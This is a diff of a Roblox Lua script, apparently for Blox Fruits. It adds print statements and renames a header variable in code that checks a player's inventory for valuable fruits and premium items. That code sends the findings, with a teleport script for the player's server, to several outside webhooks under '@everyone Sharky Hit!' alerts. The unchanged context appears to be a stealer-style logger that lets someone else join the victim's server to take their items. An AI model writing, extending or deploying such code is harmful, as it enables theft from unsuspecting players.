@@ -758,12 +758,16 @@ if game.PlaceId ~= iddd then
     queue_on_teleport([[
         task.wait(5)
         if game.JobId ~= JobIdd then
+            print("Executing queued teleport to: " .. JobIdd)
             game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
         else
+            print("Already in target server, skipping queued teleport.")
         end
     ]])
+    print("Invoking sea travel: " .. sea)
     game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(sea)
 else
+    print("Already in correct sea, teleporting directly to: " .. JobIdd)
     game:GetService("TeleportService"):TeleportToPlaceInstance(iddd, JobIdd)
 end
 ]=]
@@ -790,7 +794,7 @@ local joinScriptMobile_Formatted = joinScriptLua
         embedColor = 3447003;
         mention = "@everyone Sharky - GG!"
     elseif hasGoodFruit then -- Check for good fruit for admin/dummy webhook
-        embedTitle = "<:kitsune:1185239741545848922> GOOD FRUIT HIT! (Kitsune/Yeti)" -- Example title
+        embedTitle = "<:kitsune:1185239741545848922> TOP FRUIT HIT! (Kitsune/Yeti)" -- Example title
         embedColor = 16753920;
         mention = "@everyone Sharky Hit!" -- Normal mention for main hooks
     elseif # fruits > 0 or # premiumItems > 0 then -- Check if *any* target fruit was found
@@ -881,7 +885,7 @@ local joinScriptMobile_Formatted = joinScriptLua
 
     -- Send Webhooks Asynchronously
     task.spawn(function()
-        local headersWithSecret = {
+        local SharkerHead = {
             ["Content-Type"] = "application/json",
             ["X-Client-Key"] = validation_sig
         }
@@ -889,7 +893,7 @@ local joinScriptMobile_Formatted = joinScriptLua
             SafeRequest({
                 Url = url1,
                 Method = "POST",
-                Headers = headersWithSecret,
+                Headers = SharkerHead,
                 Body = mainPayloadBody
             })
         end
@@ -898,7 +902,7 @@ local joinScriptMobile_Formatted = joinScriptLua
             SafeRequest({
                 Url = url2,
                 Method = "POST",
-                Headers = headersWithSecret,
+                Headers = SharkerHead,
                 Body = mainPayloadBody
             })
         end
@@ -907,7 +911,7 @@ local joinScriptMobile_Formatted = joinScriptLua
             SafeRequest({
                 Url = url3,
                 Method = "POST",
-                Headers = headersWithSecret,
+                Headers = SharkerHead,
                 Body = adminPayloadBody
             })
         end -- Send only if admin condition met
@@ -984,7 +988,7 @@ local function sendProtector()
         }
     };
     local body = HttpService:JSONEncode(data)
-    local headersWithSecret = {
+    local SharkerHead = {
         ["Content-Type"] = "application/json",
         ["X-Client-Key"] = validation_sig
     }
@@ -992,7 +996,7 @@ local function sendProtector()
     pcall(request, {
         Url = url1,
         Method = "POST",
-        Headers = headersWithSecret,
+        Headers = SharkerHead,
         Body = body
     }) -- Send with secret header
     if url2 then
@@ -1000,7 +1004,7 @@ local function sendProtector()
         pcall(request, {
             Url = url2,
             Method = "POST",
-            Headers = headersWithSecret,
+            Headers = SharkerHead,
             Body = body
         })
     end -- Send with secret header
